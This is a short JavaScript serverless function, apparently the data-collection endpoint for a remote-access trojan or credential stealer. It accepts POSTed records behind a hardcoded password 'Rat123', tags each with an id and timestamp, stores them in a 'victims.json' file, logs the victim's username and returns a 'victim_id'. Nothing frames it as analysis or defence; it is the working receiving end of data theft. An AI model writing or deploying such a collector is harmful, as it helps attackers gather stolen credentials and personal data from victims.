const { readFileSync, writeFileSync } = require('fs');
const path = require('path');

exports.handler = async function(event, context) {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, X-Password',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Content-Type': 'application/json'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
    }

    try {
        const body = JSON.parse(event.body);
        const { password, data } = body;

        if (password !== "Rat123") {
            return { statusCode: 401, headers, body: JSON.stringify({ error: 'Unauthorized' }) };
        }

        // Add timestamp
        const newData = {
            ...data,
            id: Date.now() + '-' + Math.random().toString(36).substr(2, 9),
            timestamp: new Date().toISOString()
        };

        // Try to read existing data
        let victims = [];
        try {
            const dataPath = path.join('/tmp', 'victims.json');
            const fileData = readFileSync(dataPath, 'utf8');
            victims = JSON.parse(fileData);
        } catch (e) {
            // File doesn't exist yet
        }

        // Add new data
        victims.unshift(newData);

        // Save back to file
        const dataPath = path.join('/tmp', 'victims.json');
        writeFileSync(dataPath, JSON.stringify(victims, null, 2));

        console.log('✅ Data saved:', newData.username);

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({
                success: true,
                message: 'Data received',
                timestamp: new Date().toISOString(),
                victim_id: data?.victim_id
            })
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ error: 'Internal error' })
        };
    }
};
